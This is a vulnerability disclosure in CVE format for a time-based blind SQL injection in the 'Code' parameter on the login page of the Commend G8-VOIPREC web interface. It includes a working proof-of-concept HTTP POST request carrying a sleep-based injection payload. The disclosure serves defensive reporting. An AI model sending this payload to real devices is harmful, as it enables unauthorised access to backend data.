# CVE-2023-XXXXX
## [Suggested description]

G8-VOIPREC (Commend VoIPRec) web interface is vulnerable to time-base blind SQL injections in "Code" parameter on login page.

## [Additional Information]
PoC:

POST /cgi-bin/SecComRecX.cgi HTTP/1.1
Host: 192.168.88.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 78
Origin: http://192.168.88.10
Connection: close
Referer: http://192.168.88.10/ComRecX/comrecxapp.html

Action=request&Code=userpasswordasdasd'%2b(select*from(select(sleep(6)))a)%2b'


## [Vulnerability Type]
SQL Injection


## [Vendor of Product]
Commend International


## [Affected Product Code Base]
G8-VOIPREC


## [Attack Type]
Remote


## [Impact Information Disclosure]
true


## [Attack Vectors]
Remote user can use malicious SQL code for backend database manipulation to access information that was not intended to be displayed.


## [Discoverer]
Alexander Starikov (Jet Infosystems, jet.su), Ivashchenko Sergey (Jet Infosystems, jet.su)


## [Reference]
https://www.commend.com/
